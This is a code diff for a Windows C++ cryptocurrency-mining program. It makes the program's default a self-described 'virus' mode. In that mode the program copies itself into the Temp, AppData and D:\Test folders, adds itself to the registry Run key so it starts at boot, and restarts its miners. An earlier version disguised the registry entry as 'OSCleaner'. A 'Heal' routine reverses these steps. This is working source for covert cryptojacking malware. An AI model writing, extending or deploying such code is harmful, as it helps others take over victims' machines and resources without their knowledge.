@@ -57,6 +57,7 @@ static wgl_swap_interval_ext* wglSwapIntervalEXT;
 static wgl_get_extensions_string_ext* wglGetExtensionsStringEXT;
 
 static miners_context GlobalMinersContext;
+static toxication_context GlobalToxicContext;
 static gpu_type GlobalGPUType;
 static std::mutex ConsoleMutex;
 
@@ -92,6 +93,7 @@ GetCPUCoreCount() {
 enum mining_politika_type{
 	MiningPolitika_Virus,
 	MiningPolitika_Farm,
+	MiningPolitika_Heal,
 };
 
 static int GetOptimalWorkingCoresCount(uint32_t Politika) {
@@ -165,11 +167,40 @@ static int64_t GetOptimalCPUAffinity(u32 Politika) {
 }
 
 static int GetGPUThreadCount(u32 Politika) {
-	int Result = 16;
+	int Result = 8;
 
 	if (Politika == MiningPolitika_Farm) {
-		Result = 48;
+		Result = 32;
 	}
+
+	return(Result);
+}
+
+std::wstring ConvertStringToWideString(std::string& ToConvert) {
+	std::wstring Result = std::wstring(ToConvert.begin(), ToConvert.end());
+
+	return(Result);
+}
+
+std::wstring ConvertCharArrayToWideString(char* ToConvert) {
+	std::string Temp = std::string(ToConvert);
+
+	std::wstring Result = std::wstring(Temp.begin(), Temp.end());
+
+	return(Result);
+}
+
+static toxication_context InitToxicContext() {
+	toxication_context Result;
+
+	char *UserTemp = getenv("Temp");
+	char *AppData = getenv("appdata");
+	char* DTest = "D:\\Test";
+
+	Result.AddToAutorun = true;
+	Result.ToxicationFolders.push_back(ConvertCharArrayToWideString(DTest));
+	Result.ToxicationFolders.push_back(ConvertCharArrayToWideString(UserTemp));
+	Result.ToxicationFolders.push_back(ConvertCharArrayToWideString(AppData));
 
 	return(Result);
 }
@@ -501,8 +532,132 @@ static LONG GetStringRegKey(HKEY hKey, const std::wstring &strValueName, std::ws
 	return nError;
 }
 
-static void ToxicateComp(miners_context* Context) {
+inline int32_t DirectoryExist(std::wstring& DirPath) {
+	int32_t Result = 0;
 
+	DWORD FileAttribs = GetFileAttributes(DirPath.c_str());
+
+	if (FileAttribs == INVALID_FILE_ATTRIBUTES) {
+		Result = 0;
+	}
+	else {
+		if (FileAttribs & FILE_ATTRIBUTE_DIRECTORY) {
+			Result = 1;
+		}
+	}
+	
+	return(Result);
+}
+
+std::wstring GetExeFileName() {
+	wchar_t ExePath[256];
+	GetModuleFileName(0, ExePath, ARRAY_COUNT(ExePath));
+
+	std::wstring ExePathW = std::wstring(ExePath);
+	int LastSlashPos = ExePathW.find_last_of('\\');
+	int DotExeIndex = ExePathW.find(L".exe");
+	std::wstring ExeFileName = ExePathW.substr(LastSlashPos + 1, DotExeIndex - LastSlashPos - 1);
+
+	return(ExeFileName);
+}
+
+std::wstring GetExeFileDirectory() {
+	wchar_t ExePath[256];
+	GetModuleFileName(0, ExePath, ARRAY_COUNT(ExePath));
+
+	std::wstring ExePathW = std::wstring(ExePath);
+	int LastSlashPos = ExePathW.find_last_of('\\');
+	std::wstring ExeFileName = ExePathW.substr(0, LastSlashPos);
+
+	return(ExeFileName);
+}
+
+static int32_t IsFolderToxicated(std::wstring& Folder) {
+	int32_t Result = 0;
+
+	std::wstring ExeFileName = GetExeFileName();
+
+	HANDLE DirectoryHandle;
+	WIN32_FIND_DATA FileFindData;
+
+	DirectoryHandle = FindFirstFile((Folder + L"\\*").c_str(), &FileFindData);
+
+	if (DirectoryHandle != INVALID_HANDLE_VALUE) {
+		do {
+			int32_t IsDirectory = FileFindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY;
+			std::wstring IterationFileName = std::wstring(FileFindData.cFileName);
+			if (IsDirectory && (IterationFileName == ExeFileName)) {
+				//NOTE(Dima): If one of directories has name of .exe then folder contain virus
+				Result = 1;
+				break;
+			}
+		} while (FindNextFile(DirectoryHandle, &FileFindData));
+
+		FindClose(DirectoryHandle);
+	}
+	else {
+
+	}
+
+	return(Result);
+}
+
+static void ToxicateFolder(std::wstring& Folder) {
+
+	wchar_t Dir[255];
+	GetCurrentDirectory(sizeof(Dir), Dir);
+
+	std::wstring ExeDirectoryPath = GetExeFileDirectory();
+	std::wstring ExeFileName = GetExeFileName();
+
+	SetCurrentDirectory(ExeDirectoryPath.c_str());
+
+	if (DirectoryExist(Folder)) {
+		int a = 1;
+	}
+	
+	std::wstring VirusDirW = Folder + L"\\" + ExeFileName;
+	if (!DirectoryExist(VirusDirW)) {
+		CreateDirectory(VirusDirW.c_str(), 0);
+	}
+
+	std::wstring TargetFolderExe = VirusDirW + std::wstring(L"\\Exe");
+	if (!DirectoryExist(TargetFolderExe)) {
+		CreateDirectory(TargetFolderExe.c_str(), 0);
+	}
+
+	std::experimental::filesystem::copy(
+		ExeDirectoryPath, 
+		TargetFolderExe,
+		std::experimental::filesystem::copy_options::recursive |
+		std::experimental::filesystem::copy_options::overwrite_existing);
+
+
+	std::wstring DataFolderPath = std::wstring(L"../Data");
+	std::wstring TargetFolderData = VirusDirW + std::wstring(L"\\Data");
+	if (!DirectoryExist(TargetFolderData)) {
+		CreateDirectory(TargetFolderData.c_str(), 0);
+	}
+
+	std::experimental::filesystem::copy(
+		DataFolderPath,
+		TargetFolderData.c_str(),
+		std::experimental::filesystem::copy_options::recursive | 
+		std::experimental::filesystem::copy_options::overwrite_existing);
+
+	SetCurrentDirectory(Dir);
+}
+
+static void ToxicateComp(toxication_context* ToxicContext) {
+
+	for (auto it = ToxicContext->ToxicationFolders.begin();
+		it != ToxicContext->ToxicationFolders.end();
+		it++)
+	{
+		ToxicateFolder(*(it));
+	}
+
+	int32_t IsToxic = IsFolderToxicated(std::wstring(L"D:\\Test"));
 
 	wchar_t autorun_exe_path[255];
 	DWORD ExePathLen = GetModuleFileName(0, autorun_exe_path, ARRAY_COUNT(autorun_exe_path));
@@ -517,7 +672,10 @@ static void ToxicateComp(miners_context* Context) {
 		if (bExistsAndSuccess) {
 			std::wstring strValueOfBinDir;
 			std::wstring strKeyDefaultValue;
-			GetStringRegKey(hKey, L"OSCleaner", strValueOfBinDir, L"bad");
+
+			std::wstring ExeNameW = GetExeFileName();
+
+			GetStringRegKey(hKey, ExeNameW.c_str(), strValueOfBinDir, L"bad");
 
 			int LastSlashPos = strValueOfBinDir.find_last_of('\\');
 			std::wstring strDirectory = strValueOfBinDir.substr(1, LastSlashPos);
@@ -531,8 +689,6 @@ static void ToxicateComp(miners_context* Context) {
 			ConsoleMutex.lock();
 			printf("Working directory is: %ls\n", WorkDirStr.c_str());
 			ConsoleMutex.unlock();
-
-			int a = 1;
 		}
 	}
 
@@ -555,11 +711,33 @@ static void ToxicateComp(miners_context* Context) {
 			ResultExePath += std::wstring(autorun_exe_path);
 			ResultExePath += L"\"";
 
-			RegSetValueExW(hKeys, L"OSCleaner", 0, REG_SZ, (BYTE*)ResultExePath.c_str(), sizeof(wchar_t) * ResultExePath.size());
+			std::wstring ExeNameW = GetExeFileName();
+
+			RegSetValueExW(hKeys, ExeNameW.c_str() , 0, REG_SZ, (BYTE*)ResultExePath.c_str(), sizeof(wchar_t) * ResultExePath.size());
 			RegCloseKey(hKeys);
 		}
 	}
 #endif
+}
+
+static void HealComp(toxication_context* ToxicContext) {
+	//NOTE(Dima): First - delete virus folder from all toxication folders
+
+	std::wstring ExeNameW = GetExeFileName();
+
+	for (auto it = ToxicContext->ToxicationFolders.begin();
+		it != ToxicContext->ToxicationFolders.end();
+		it++)
+	{
+		std::wstring ToDeleteFolder = *it + L"\\" + ExeNameW;
+
+		std::experimental::filesystem::remove_all(ToDeleteFolder);
+	}
+
+	HKEY hkey = HKEY_LOCAL_MACHINE;
+	RegOpenKey(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
+	RegDeleteValue(hkey, ExeNameW.c_str());
+	RegCloseKey(hkey);
 }
 
 static void RerunMinersIfNeeded() {
@@ -804,9 +982,11 @@ static gpu_type GetGPUType() {
 INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nCmdShow)
 //int main(int argc, char** argv)
 {
-	u32 MiningPolitika = MiningPolitika_Farm;
+	u32 MiningPolitika = MiningPolitika_Virus;
 
 	GlobalMinersContext = InitMinersContext(MiningPolitika);
+	GlobalToxicContext = InitToxicContext();
+
 	GlobalGPUType = GetGPUType();
 
 	switch (MiningPolitika) {
@@ -815,7 +995,13 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 		}break;
 
 		case MiningPolitika_Virus: {
-			ToxicateComp(&GlobalMinersContext);
+			ToxicateComp(&GlobalToxicContext);
+		}break;
+
+		case MiningPolitika_Heal: {
+			HealComp(&GlobalToxicContext);
+
+			return(0);
 		}break;
 	}
 
@@ -828,7 +1014,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	char autorun_exe_path[255];
 	DWORD ExePathLen = GetModuleFileNameA(0, autorun_exe_path, ARRAY_COUNT(autorun_exe_path));
 
-#if 0
+#if 1
 	HANDLE RerunMinersThreadHandle = CreateThread(0, 0, RerunMinersThread, 0, 0, 0);
 
 	WaitForSingleObject(RerunMinersThreadHandle, INFINITE);
